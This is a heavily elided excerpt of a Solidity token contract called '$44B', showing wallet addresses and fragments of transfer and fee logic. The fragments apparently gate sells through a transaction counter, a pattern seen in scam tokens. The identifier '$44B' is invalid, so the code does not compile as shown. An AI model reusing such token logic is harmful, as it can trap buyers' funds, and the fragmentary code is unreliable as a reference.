...
// Telegram : https://t.me/fortyfourBSC
...
contract $44B is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "$44B";
    string private _symbol = "$44B";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x0fE060B658D199D2763a5C8dAa39D0b23714B98B); // Marketing Address
    address payable public BuyBackWalletAddress = payable(0xaF0399E6C283F7BD0417584BC256b61f67b3DCE0); // BuyBack Address
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            sTransactionCount = finalAmount == amount && isLiquidityPair[recipient] ? 1 : sTransactionCount;
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        else if(isMarketPair[recipient] && sTransactionCount >=1) {
